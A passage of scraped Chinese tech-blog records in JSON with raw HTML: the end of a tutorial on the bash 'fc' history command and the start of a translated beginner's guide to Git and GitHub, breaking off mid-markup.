crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n fc -lE\r\n 2 5.4.2018 18:41 clear\r\n 3 5.4.2018 18:42 fc -l\r\n 4 5.4.2018 18:42 sudo netctl restart wlp9s0sktab\r\n 5 5.4.2018 18:42 ls -l\r\n 6 5.4.2018 18:42 pwd\r\n 7 5.4.2018 18:42 uname -r\r\n 8 5.4.2018 18:43 uname -a\r\n 9 5.4.2018 18:43 cat ostechnix.txt\r\n 10 5.4.2018 18:43 echo \"Welcome to OSTechNix\"\r\n 11 5.4.2018 18:43 more ostechnix.txt\r\n 12 5.4.2018 18:43 wc -l ostechnix.txt\r\n 13 5.4.2018 18:43 cat ostechnix.txt\r\n 14 5.4.2018 18:43 clear\r\n 15 5.4.2018 18:43 fc -l\r\n 16 5.4.2018 18:43 fc -ld\r\n 17 5.4.2018 18:49 fc -lf\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc3108526714-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc3108526714-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">lE</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">41</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">netctl </span><span class=\"crayon-e\">restart </span><span class=\"crayon-i\">wlp9s0sktab</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-6\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pwd</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">r</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">uname</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Welcome to OSTechNix\"</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">more </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">13</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cat </span><span class=\"crayon-v\">ostechnix</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">14</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">clear</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-15\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-16\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">ld</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc3108526714-17\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5.4.2018</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">49</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">lf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc3108526714-18\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<p></p>\n<h3 id=\"toc_7\">fc 用法总结</h3>\n<ul>\n<li>当不带任何参数时，<code>fc</code> 将上一个命令载入默认编辑器。</li>\n<li>当带一个数字作为参数时，<code>fc</code> 将数字指定的命令载入默认编辑器。</li>\n<li>当带一个字符作为参数时，<code>fc</code> 将最近一个以指定字符开头的命令载入默认编辑器。</li>\n<li>当有两个参数时，它们分别指定需要列出的命令范围的开始和结束。</li>\n</ul>\n<p>更多细节，请参考 man 手册。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa931c7fc7973800617\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ man fc\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa931c7fc7973800617-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa931c7fc7973800617-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa931c7fc7973800617-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">man </span><span class=\"crayon-i\">fc</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa931c7fc7973800617-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>好了，今天就这些。希望这篇文章能帮助到你。更多精彩内容，敬请期待！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113926\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113926votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113926\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/113926/", "url_obj_id": "f65acad5ef6af86c7aabdf707fd8d461"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2016/02/2027c50856ddfe647e45b4ac2e86c9f1.jpg"], "title": "手把手指导您使用 Git", "create_date": "2018/06/08 ·", "praise_num": 1, "fav_num": 5, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/18/1/step-step-guide-git\">Kedar Vijay Kulkarni</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9319-1.html\">Linux中国/ChenYi</a>   </div><p>如果您从未使用过 <a href=\"https://opensource.com/resources/what-is-git\">Git</a>，甚至可能从未听说过它。莫慌张，只需要一步步地跟着这篇入门教程，很快您就会在 <a href=\"https://opensource.com/life/15/11/short-introduction-github\">GitHub</a> 上拥有一个全新的 Git 仓库。</p>\n<p>在开始之前，让我们先理清一个常见的误解：Git 并不是 GitHub。Git 是一套版本控制系统（或者说是一款软件），能够协助您跟踪计算机程序和文件在任何时间的更改。它同样允许您在程序、代码和文件操作上与同事协作。GitHub 以及类似服务（包括 GitLab 和 BitBucket）都属于部署了 Git 程序的网站，能够托管您的代码。</p>\n<h3 id=\"toc_1\">步骤 1：申请一个 GitHub 账户</h3>\n<p>在 <a href=\"https://github.com/\">GitHub.com</a> 网站上（免费）创建一个账户是最简单的方式。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2ea0e8b205ec27442832ce5b1e0c4b8e.png\" alt=\"\"></p>\n<p>选择一个用户名（比如说，octocat123），输入您的邮箱地址和密码，然后点击 <strong>Sign up for GitHub</strong>。进入之后，您将看到下方插图的界面：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/40cb004cd0b2c76974a758187dd42609.png\" alt=\"\"></p>\n<h3 id=\"toc_2\">步骤 2：创建一个新的仓库</h3>\n<p>一个仓库（ repository），类似于能储存物品的场所或是容器；在这里，我们创建仓库存储代码。在 <code>+</code> 符号（在插图的右上角，我已经选中它了） 的下拉菜单中选择 <strong>New Repository</strong>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/03428a7fdaed912f2fe0b4cd3d7e6b21.png\" alt=\"\"></p>\n<p>给您的仓库命名（比如说，Demo）然后点击 <strong>Create Repository</strong>。无需考虑本页面的其他选项。</p>\n<p>恭喜！您已经在 GitHub.com 中建立了您的第一个仓库。</p>\n<h3 id=\"toc_3\">步骤 3: 创建文件</h3>\n<p>当仓库创建完毕后，界面将和下方一致：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/495f98aaf52d221a19f36c00fab9f348.png\" alt=\"\"></p>\n<p>不必惊慌，它比看上去简单。跟紧步骤。忽略其他内容，注意截图上的 “…or create a new repository on the command line,”。</p>\n<p>在您的计算机中打开终端。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/2d4acbf3a6a04a52708163d0e0076ab6.png\" alt=\"\"></p>\n<p>键入 <code>git</code> 然后回车。如果命令行显示 <code>bash: git: command not found</code>，在您的操作系统或发行版 <a href=\"https://www.linuxbabe.com/linux-server/install-git-verion-control-on-linux-debianubuntufedoraarchlinux#crt-2\">安装 Git</a> 命令。键入 <code>git</code> 并回车检查是否成功安装；如果安装成功，您将看见大量关于使用该命令的说明信息。</p>\n<p>在终端内输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede612373174851\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkdir Demo\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede612373174851-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede612373174851-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede612373174851-1\"><span class=\"crayon-e\">mkdir </span><span class=\"crayon-i\">Demo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede612373174851-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这个命令将会创建一个名为 Demo 的目录（文件夹）。</p>\n<p>如下命令将会切换终端目录，跳转到 Demo 目录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede61e106789409\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd Demo\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa92ede61e106789409-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa92ede61e106789409-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa92ede61e106789409-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-i\">Demo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa92ede61e106789409-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>然后输入：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa92ede622945361767\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; 